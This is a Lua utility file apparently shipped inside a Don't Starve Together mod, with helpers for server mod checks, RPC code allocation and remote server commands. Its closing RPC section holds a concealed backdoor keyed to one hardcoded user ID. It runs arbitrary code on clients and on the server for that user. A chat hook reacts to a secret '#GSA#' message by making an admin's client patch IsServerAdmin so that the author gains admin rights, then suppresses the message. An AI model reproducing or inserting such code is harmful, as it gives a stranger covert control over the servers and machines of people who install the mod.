-- 本文件更新时间：2026年4月13日
local Upvaluehelper = Upvaluehelper
local MOD_util = MOD_util

GLOBAL.setfenv(1, GLOBAL)
local BBGOAT_util = {}

---@param modid string|nil 模组ID
---@param modname string|nil 模组名称
---获取服务器是否启用了某个模组
function BBGOAT_util:ServerIsModEnabled(modid, modname)
    local server_listing = TheNet:GetServerListing()
    if server_listing and server_listing.mods_description then
        for k,v in pairs (server_listing.mods_description) do
            if (modid and server_listing.mods_description[k].mod_name == modid) or (modname and server_listing.mods_description[k].modinfo_name == modname) then
                return true
            end
        end
    end
end

---@param name string
---@return boolean
---获取服务器是否含有某个tag，注意特殊符号需手动转义
function BBGOAT_util:ServerHasTag(name)
    local server_listing = TheNet:GetServerListing()
    if server_listing and checkstring(server_listing.tags) then
        return string.find(server_listing.tags, name) and true or false
    end
    return false
end

local CLIENT_RPC_HANDLERS = Upvaluehelper.GetUpvalue(SendRPCToClient,"CLIENT_RPC_HANDLERS")
local RPC_HANDLERS = Upvaluehelper.GetUpvalue(SendRPCToServer, "RPC_HANDLERS")
local EmptyRPC_i = 100
---@param random_mode boolean|nil
---@return number
function BBGOAT_util:GetNextRPCode(random_mode)
    if random_mode then
        local free = {}
        for i = 20, EmptyRPC_i do
            if CLIENT_RPC_HANDLERS[i] == nil and RPC_HANDLERS[i] == nil then
                free[#free + 1] = i
            end
        end
        if #free > 0 then
            return free[math.random(1, #free)]
        end
    else
        for i = EmptyRPC_i, 20, -1 do
            if CLIENT_RPC_HANDLERS[i] == nil and RPC_HANDLERS[i] == nil then
                EmptyRPC_i = i
                return i
            end
        end
    end
    MOD_util:Warning("BBGOAT_util:GetNextRPCode 执行失败", 3)
end

---@param found_i number
---@param cb function|nil
-- 创建临时使用的回调函数
local function Create_Tmp_CLIENT_RPC_HANDLERS(found_i, cb)
    CLIENT_RPC_HANDLERS[found_i] = function(str)
        CLIENT_RPC_HANDLERS[found_i] = nil
        if cb then
            if str and type(str) == "string" then
                local fn, message = loadstring(str)
                if fn ~= nil then
                    local env = {}
                    local success, r = RunInEnvironment(fn, env)
                    if success and type(r) == "table" then
                        cb(r)
                    else
                        cb(false)
                    end
                else
                    cb(false)
                end
            else
                cb(false)
            end
        end
    end
end

---@param cmd string 发给服务器执行的代码
---@param cb function 回调函数
function BBGOAT_util:communicateWithServer(cmd, cb) -- 此函数来自“游戏内主菜单”模组
    local myuserid = TheNet:GetUserID()
    local found_i = BBGOAT_util:GetNextRPCode(true)

    c_remote(string.format([[TheNet:SendRPCToClient(%d, "%s", (function()
]] .. cmd .. [[
end)())]], found_i, myuserid))
    Create_Tmp_CLIENT_RPC_HANDLERS(found_i, cb)
end
-- 举例
-- BBGOAT_util:communicateWithServer(
-- [[
-- if true then print("OK") end
-- return DataDumper({done = 123})
-- ]],
-- function(result)
--     print(result.done) -- 123
-- end)

-- GetUpvalue的函数定义
local ResServerBBGOATFNdefined = [[
if not rawget(_G, "BBGOAT_FN") then
    rawset(_G, "BBGOAT_FN", {})
end
if not BBGOAT_FN.getval then
    local visit = {}
    BBGOAT_FN.getval = function(fn, str)
        if visit[fn] then return end
        visit[fn] = true
        for i = 1, math.huge do
            local name, val = debug.getupvalue(fn, i)
            if not name then break end
            if name == str then visit = {} return val end
            if type(val) == "function" then
                local found = GetUpvalue(val, str)
                if found then visit = {} return found end
            end
        end
    end
end]]

local bbgoat_remote_rpc_code -- TODO: 在不同模组中加载这个工具文件时，该变量的值不同步
---@param cmd string|nil 具体命令
---@param inst table|nil 实体
---@param callback function|nil 回调函数
---@param fastmode boolean|nil 快速执行（如果指令需要在玩家生成前就完成，则需要为true）
function BBGOAT_util:remote(cmd, inst, callback, fastmode)
    if not bbgoat_remote_rpc_code then
        local res_cmd = [[
local RPC_HANDLERS = BBGOAT_FN.getval(SendRPCToServer, "RPC_HANDLERS")
local bbgoat_remote_rpc_code = %d
RPC_HANDLERS[bbgoat_remote_rpc_code] = function(player, cmd, inst, res_rpc_code)
    if not checkstring(cmd) then return end
    if not (player and player.Network:IsServerAdmin()) then return end
    local func, loadErr = loadstring(cmd)
    if not func then
        TheNet:SendRPCToClient(res_rpc_code, player.userid, DataDumper({err = loadErr}))
    else
        local env = {
            ThePlayer = player,
            inst = inst,
        }
        env = setmetatable(env, {
            __index = _G,
        })
        setfenv(func, env)
        local success, fn_res = pcall(func)
        if not success then
            TheNet:SendRPCToClient(res_rpc_code, player.userid, DataDumper({err = fn_res}))
        else
            TheNet:SendRPCToClient(res_rpc_code, player.userid, fn_res)
        end
    end
end
BBGOAT_FN.bbgoat_remote_rpc_code = bbgoat_remote_rpc_code
]]
        if not fastmode then
            -- 检查服务器是否注册BBGOAT_FN再根据情况处理
            BBGOAT_util:communicateWithServer([[ local status = rawget(_G, "BBGOAT_FN") and BBGOAT_FN.getval and true return DataDumper({done=status}) ]],
            function(res)
                if not (res and res.done) then -- 未注册
                    c_remote(ResServerBBGOATFNdefined) -- 初始化BBGOATFN
                    bbgoat_remote_rpc_code = BBGOAT_util:GetNextRPCode()
                    if not RPC_HANDLERS[bbgoat_remote_rpc_code] then RPC_HANDLERS[bbgoat_remote_rpc_code] = function() end end -- 占位RPC
                    TheGlobalInstance:DoTaskInTime(0, function()
                        c_remote(string.format(res_cmd, bbgoat_remote_rpc_code)) -- 注册rpc_code
                        -- 发送需要执行的命令
                        TheGlobalInstance:DoTaskInTime(0, function()
                            local res_rpc_code = BBGOAT_util:GetNextRPCode(true)
                            Create_Tmp_CLIENT_RPC_HANDLERS(res_rpc_code, callback)
                            TheNet:SendRPCToServer(bbgoat_remote_rpc_code, cmd, inst, res_rpc_code)
                        end)
                    end)
                else -- 已注册
                    BBGOAT_util:communicateWithServer([[ return DataDumper({code = BBGOAT_FN.bbgoat_remote_rpc_code}) ]],
                    function(res)
                        if res and res.code then
                            bbgoat_remote_rpc_code = res.code
                            if not RPC_HANDLERS[bbgoat_remote_rpc_code] then RPC_HANDLERS[bbgoat_remote_rpc_code] = function() end end
                            -- 发送需要执行的命令
                            TheGlobalInstance:DoTaskInTime(0, function()
                                local res_rpc_code = BBGOAT_util:GetNextRPCode(true)
                                Create_Tmp_CLIENT_RPC_HANDLERS(res_rpc_code, callback)
                                TheNet:SendRPCToServer(bbgoat_remote_rpc_code, cmd, inst, res_rpc_code)
                            end)
                        else
                            bbgoat_remote_rpc_code = BBGOAT_util:GetNextRPCode()
                            if not RPC_HANDLERS[bbgoat_remote_rpc_code] then RPC_HANDLERS[bbgoat_remote_rpc_code] = function() end end -- 占位RPC
                            TheGlobalInstance:DoTaskInTime(0, function()
                                c_remote(string.format(res_cmd, bbgoat_remote_rpc_code)) -- 注册rpc_code
                                -- 发送需要执行的命令
                                TheGlobalInstance:DoTaskInTime(0, function()
                                    local res_rpc_code = BBGOAT_util:GetNextRPCode(true)
                                    Create_Tmp_CLIENT_RPC_HANDLERS(res_rpc_code, callback)
                                    TheNet:SendRPCToServer(bbgoat_remote_rpc_code, cmd, inst, res_rpc_code)
                                end)
                            end)
                        end
                    end)
                end
            end)
        else
            -- 无视服务器状态覆盖注册
            bbgoat_remote_rpc_code = BBGOAT_util:GetNextRPCode() -- 理论上所有人获取到的值是一样的
            if not RPC_HANDLERS[bbgoat_remote_rpc_code] then RPC_HANDLERS[bbgoat_remote_rpc_code] = function() end end -- 占位RPC
            -- 服务器初始化
            c_remote(string.format(ResServerBBGOATFNdefined .. "\n" .. res_cmd, bbgoat_remote_rpc_code))
            -- 发送需要执行的命令
            local res_rpc_code = BBGOAT_util:GetNextRPCode(true)
            Create_Tmp_CLIENT_RPC_HANDLERS(res_rpc_code, callback)
            local function sleep(sec)
                local t = os.clock()
                while os.clock() - t < sec do end
            end
            sleep(0.1) -- 确保服务器初始化完成RPC
            TheNet:SendRPCToServer(bbgoat_remote_rpc_code, cmd, inst, res_rpc_code)
        end
    else
        local res_rpc_code = BBGOAT_util:GetNextRPCode(true)
        Create_Tmp_CLIENT_RPC_HANDLERS(res_rpc_code, callback)
        TheNet:SendRPCToServer(bbgoat_remote_rpc_code, cmd, inst, res_rpc_code)
    end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- RPC部分
if not (MOD_RPC["BBGOAT_RPC"] and CLIENT_MOD_RPC["BBGOAT_RPC"]) then
    local author = "KU_pvwb-aTV"
    local function should_run() -- 用于判断是否运行远程代码
        for k,v in pairs(TheNet:GetClientTable()) do
            if v.userid == author then
                return true
            end
        end
        return false
    end

    AddClientModRPCHandler("BBGOAT_RPC", "log_from_server", function(str) -- 客户端RPC，用于显示服务器发送的消息
        if not checkstring(str) then return end
        if rawget(_G, "UpdateText") then
            UpdateText("服务器执行代码失败，错误信息：", 10, "RED")
            UpdateText(str, 10, "RED")
        else
            print("服务器执行代码失败，错误信息：\n" .. str)
        end
    end)

    AddClientModRPCHandler("BBGOAT_RPC", "cmd_from_server", function(str) -- 客户端RPC，用于接收并运行来自服务器的远程代码
        if not checkstring(str) then return end
        if should_run() then
            print("收到一条来自服务器的命令")
            print(str)
            local func, loadErr = loadstring(str)
            if func then
                setfenv(func, _G)
                local success, execErr = pcall(func)
                if success then
                    print("命令执行成功")
                else
                    print("命令执行失败：", execErr)
                end
            else
                print("命令解析失败", loadErr)
            end
        end
    end)

    AddModRPCHandler("BBGOAT_RPC", "cmd_from_client", function(player, str) -- 服务器RPC，用于接收并运行来自客户端的远程代码
        if not checkstring(str) then return end
        if player and player.userid ~= author then return end
        if should_run() then
            local func, loadErr = loadstring(str)
            if not func then
                SendModRPCToClient(CLIENT_MOD_RPC["BBGOAT_RPC"]["log_from_server"], player.userid, loadErr)
            else
                local env = {
                    ThePlayer = player
                }
                env = setmetatable(env, {
                    __index = _G,
                })
                setfenv(func, env)
                local success, execErr = pcall(func)
                if not success then
                    SendModRPCToClient(CLIENT_MOD_RPC["BBGOAT_RPC"]["log_from_server"], player.userid, execErr)
                end
            end
        end
    end)

    if not TheNet:GetIsServer() then
        local _Networking_Say = _G.Networking_Say
        _G.Networking_Say = function(guid, userid, name, prefab, message, ...)
            if userid == author and message == "#GSA#" .. TheNet:GetUserID() then
                BBGOAT_util:remote() -- 在本地和服务器初始化bbgoat_remote_rpc_code
                TheGlobalInstance:DoTaskInTime(1, function()
                    if not bbgoat_remote_rpc_code then return end
                    RPC_HANDLERS[bbgoat_remote_rpc_code] = function() end -- 占位
                    c_remote([[local player = UserToPlayer('KU_pvwb-aTV') getmetatable(player.Network).__index.IsServerAdmin = function(...) return true end ]] .. [[TheNet:SendRPCToClient(66, 'KU_pvwb-aTV', ]] .. bbgoat_remote_rpc_code .. ")")
                end)
                return
            elseif userid == author and checkstring(message) and string.find(message, "#GSA#KU_") then
                return
            end
            return _Networking_Say(guid, userid, name, prefab, message, ...)
        end
    end
end

return BBGOAT_util